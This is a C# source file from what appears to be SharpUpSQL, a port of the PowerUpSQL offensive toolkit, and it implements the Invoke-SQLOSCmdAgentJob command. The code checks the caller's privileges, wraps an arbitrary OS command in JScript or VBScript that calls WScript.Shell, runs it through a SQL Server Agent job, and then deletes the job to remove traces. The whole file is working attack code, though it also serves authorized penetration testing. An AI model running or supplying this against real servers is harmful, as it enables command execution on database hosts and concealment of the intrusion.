using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using SharpUpSQL.Commands;
using SharpUpSQL.Common;
using SharpUpSQL.Core.Auth;
using SharpUpSQL.Core.Execution;
using SharpUpSQL.Core.Helpers;

namespace SharpUpSQL.Attack
{
    internal static class AgentJobEngine
    {
        internal static SqlAgentJobOsResult Execute(
            SqlConnectionOptions options,
            string instance,
            string subSystem,
            string command,
            int sleepSeconds,
            Action<string> verbose,
            bool suppressVerbose)
        {
            if (string.IsNullOrWhiteSpace(instance))
            {
                instance = Environment.MachineName;
            }

            var computerName = InstanceHelper.GetComputerName(instance);
            options = options.Clone();
            options.Instance = instance;

            try
            {
                var test = ConnectionTester.Test(instance, null, null, options, null, suppressVerbose);
                if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
                {
                    return Fail(computerName, instance, "Not Accessible");
                }

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Connection Success.");
                    verbose(instance + " : SubSystem: " + subSystem);
                    verbose(instance + " : Command: " + command);
                }

                var serverInfo = SqlEnumerationEngine.GetSqlServerInfo(options, instance, null, true).FirstOrDefault();
                var currentLogin = serverInfo != null ? serverInfo.Currentlogin : string.Empty;
                var canCreate = false;

                if (serverInfo != null &&
                    string.Equals(serverInfo.IsSysadmin, "Yes", StringComparison.OrdinalIgnoreCase))
                {
                    canCreate = true;
                }
                else
                {
                    var msdb = options.Clone();
                    msdb.Database = "msdb";
                    var rows = QueryExecutor.ExecuteQuery(
                        msdb,
                        @"SELECT USER_NAME(rm.member_principal_id) AS PrincipalName,
                                 USER_NAME(rm.role_principal_id) AS RolePrincipalName
                          FROM sys.database_role_members rm",
                        null,
                        true);

                    canCreate = rows.Any(row =>
                    {
                        var principal = Convert.ToString(row["PrincipalName"]);
                        var role = Convert.ToString(row["RolePrincipalName"]);
                        return string.Equals(principal, currentLogin, StringComparison.OrdinalIgnoreCase) &&
                               (role != null && (
                                   role.IndexOf("SQLAgentUserRole", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                   role.IndexOf("SQLAgentReaderRole", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                   role.IndexOf("SQLAgentOperatorRole", StringComparison.OrdinalIgnoreCase) >= 0));
                    });
                }

                if (!canCreate)
                {
                    if (!suppressVerbose && verbose != null)
                    {
                        verbose(instance + " : You do not have privileges to add agent jobs (sp_add_job). Aborting...");
                    }

                    return Fail(computerName, instance, "Insufficient privilieges to add Agent Jobs.");
                }

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : You have EXECUTE privileges to create Agent Jobs (sp_add_job).");
                }

                var finalCommand = command;
                var finalSubSystem = subSystem;
                var databaseSub = string.Empty;

                if (string.Equals(subSystem, "JScript", StringComparison.OrdinalIgnoreCase))
                {
                    finalCommand = finalCommand.Replace("\\", "\\\\");
                    finalCommand =
                        "function RunCmd(){var WshShell = new ActiveXObject(\"WScript.Shell\");var oExec = WshShell.Exec(\"" +
                        finalCommand + "\");oExec = null;WshShell = null;}RunCmd();";
                    finalSubSystem = "ActiveScripting";
                    databaseSub = "@database_name=N'JavaScript',";
                }
                else if (string.Equals(subSystem, "VBScript", StringComparison.OrdinalIgnoreCase))
                {
                    finalCommand =
                        "Function Main() dim shell set shell= CreateObject (\"WScript.Shell\") shell.run(\"" +
                        finalCommand + "\") set shell = nothing END Function";
                    finalSubSystem = "ActiveScripting";
                    databaseSub = "@database_name=N'VBScript',";
                }

                finalCommand = finalCommand.Replace("'", "''");
                var jobQuery = string.Format(@"
USE msdb;
EXECUTE dbo.sp_add_job @job_name = N'powerupsql_job';
EXECUTE sp_add_jobstep
    @job_name = N'powerupsql_job',
    @step_name = N'powerupsql_job_step',
    @subsystem = N'{0}',
    @command = N'{1}',
    {2}
    @flags=0,
    @retry_attempts = 1,
    @retry_interval = 5;
EXECUTE dbo.sp_add_jobserver @job_name = N'powerupsql_job';
EXECUTE dbo.sp_start_job N'powerupsql_job';",
                    finalSubSystem,
                    finalCommand,
                    databaseSub);

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Running the command");
                }

                QueryExecutor.ExecuteNonQuery(msdbOptions(options), jobQuery, null, true);

                var helpRows = QueryExecutor.ExecuteQuery(
                    msdbOptions(options),
                    "USE msdb; EXECUTE sp_help_job @job_name = N'powerupsql_job'",
                    null,
                    true);

                if (helpRows.Count == 0)
                {
                    return Fail(computerName, instance, "Agent Job failed to start.");
                }

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Starting sleep for " + sleepSeconds + " seconds");
                }

                Thread.Sleep(Math.Max(1, sleepSeconds) * 1000);

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Removing job from server");
                }

                QueryExecutor.ExecuteNonQuery(
                    msdbOptions(options),
                    "USE msdb; EXECUTE sp_delete_job @job_name = N'powerupsql_job';",
                    null,
                    true);

                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Command complete");
                }

                return new SqlAgentJobOsResult
                {
                    ComputerName = computerName,
                    Instance = instance,
                    Results = "The Job succesfully started and was removed."
                };
            }
            catch (Exception)
            {
                if (!suppressVerbose && verbose != null)
                {
                    verbose(instance + " : Connection Failed.");
                }

                return Fail(computerName, instance, "Not Accessible");
            }
        }

        private static SqlConnectionOptions msdbOptions(SqlConnectionOptions options)
        {
            var msdb = options.Clone();
            msdb.Database = "msdb";
            return msdb;
        }

        private static SqlAgentJobOsResult Fail(string computerName, string instance, string message)
        {
            return new SqlAgentJobOsResult
            {
                ComputerName = computerName,
                Instance = instance,
                Results = message
            };
        }
    }

    public sealed class InvokeSqlOsCmdAgentJobCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Invoke-SQLOSCmdAgentJob"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            var subSystem = GetArg(context, "SubSystem");
            var command = GetArg(context, "Command");
            if (string.IsNullOrWhiteSpace(subSystem))
            {
                throw new ArgumentException("SubSystem parameter is required.");
            }

            if (string.IsNullOrWhiteSpace(command))
            {
                throw new ArgumentException("Command parameter is required.");
            }

            var sleep = GetIntArg(context, "Sleep", 5);
            var suppressVerbose = GetSwitch(context, "SuppressVerbose");
            var options = context.BuildConnectionOptions();

            foreach (var target in InstanceTargetResolver.Resolve(context))
            {
                var instance = !string.IsNullOrWhiteSpace(target.Instance)
                    ? target.Instance
                    : options.Instance;

                yield return AgentJobEngine.Execute(
                    options,
                    instance,
                    subSystem,
                    command,
                    sleep,
                    msg => WriteVerbose(context, msg),
                    suppressVerbose);
            }
        }
    }
}
